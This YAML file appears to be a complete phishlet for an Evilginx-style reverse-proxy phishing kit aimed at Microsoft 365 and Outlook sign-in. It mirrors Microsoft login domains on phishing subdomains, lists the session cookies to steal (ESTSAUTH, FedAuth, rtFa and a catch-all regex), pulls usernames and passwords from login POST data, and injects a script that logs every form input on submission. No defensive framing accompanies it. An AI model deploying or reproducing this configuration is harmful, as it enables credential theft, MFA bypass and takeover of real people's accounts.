author: '@trust-hybrid'
min_ver: '3.3.0'

proxy_hosts:
  - { phish_sub: "login",   orig_sub: "login",   domain: "microsoftonline.com", session: true,  is_landing: true }
  - { phish_sub: "logon",   orig_sub: "login",   domain: "live.com",            session: true,  is_landing: false }
  - { phish_sub: "outlook", orig_sub: "outlook", domain: "office.com",         session: true,  is_landing: false }
  - { phish_sub: "www",     orig_sub: "www",     domain: "office.com",         session: true,  is_landing: false }
  - { phish_sub: "account", orig_sub: "account", domain: "microsoft.com",      session: true,  is_landing: false }

sub_filters: []

auth_tokens:
  # Static tokens
  - domain: "login.microsoftonline.com"
    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-gateway-slice", "stsservicecookie"]

  - domain: "live.com"
    keys: ["MSPRequ", "MSPOK", "PPAuth"]

  - domain: "login.live.com"
    keys: ["MSPRequ", "MSPOK", "PPAuth"]

  - domain: "outlook.office.com"
    keys: ["MSPAuth", "MSCC", "MSPOK", "ClientId", "AccessToken", "rtFa", "FedAuth"]

  # Regex (debug/full token capture mode)
  - domain: ".live.com"
    keys: [".*:regexp"]
  - domain: "live.com"
    keys: [".*:regexp"]
  - domain: ".login.live.com"
    keys: [".*:regexp"]
  - domain: "login.live.com"
    keys: [".*:regexp"]
  - domain: ".login.microsoftonline.com"
    keys: [".*:regexp"]
  - domain: "login.microsoftonline.com"
    keys: [".*:regexp"]
  - domain: ".microsoft.com"
    keys: [".*:regexp"]
  - domain: "microsoft.com"
    keys: [".*:regexp"]
  - domain: ".outlook.com"
    keys: [".*:regexp"]
  - domain: "outlook.com"
    keys: [".*:regexp"]

credentials:
  username:
    key: "login"
    search: "(.*)"
    type: "post"

  password:
    key: "passwd"
    search: "(.*)"
    type: "post"

auth_urls:
  - "/common/oauth2/nativeclient"
  - "/kmsi"
  - "/landingv2"
  - "/login.srf"
  - "/auth/login"
  - "/common/oauth2"
  - "/common/oauth2/authorize"
  - "/common/oauth2/v2.0/authorize"
  - "/common/oauth2/v2.0/token"

login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains:
      - "login.microsoftonline.com"
      - "login.live.com"
    trigger_paths:
      - "/"
      - "/common/oauth2/authorize"
      - "/common/oauth2/v2.0/authorize"
      - "/landingv2"
    script: |
      document.addEventListener('DOMContentLoaded', function() {
        const form = document.querySelector('form');
        if (form) {
          form.addEventListener('submit', function() {
            const inputs = form.querySelectorAll('input');
            inputs.forEach(function(input) {
              console.log('[KEYLOG]', input.name + ' = ' + input.value);
            });
          });
        }
      });

config:
  invisible_iframe: true
  log_requests: true